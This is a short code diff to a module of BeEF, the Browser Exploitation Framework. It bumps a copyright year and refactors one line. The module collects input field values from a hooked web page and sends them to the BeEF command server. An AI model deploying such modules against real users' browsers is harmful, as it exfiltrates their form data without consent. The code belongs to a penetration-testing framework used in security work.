@@ -1,5 +1,5 @@
 //
-// Copyright (c) 2006-2020 Wade Alcorn - wade@bindshell.net
+// Copyright (c) 2006-2021 Wade Alcorn - wade@bindshell.net
 // Browser Exploitation Framework (BeEF) - http://beefproject.com
 // See the file 'doc/COPYING' for copying permission
 //
@@ -25,7 +25,7 @@ beef.execute(function() {
 
 	// return input field info
 	if (input_values.length) {
-		beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result='+JSON.stringify(input_values.unique()));
+    beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result='+JSON.stringify(unique(input_values)));
 	// return if no input fields were found
 	} else {
 		beef.net.send('<%= @command_url %>', <%= @command_id %>, 'error=Could not find any inputs fields on '+window.location);
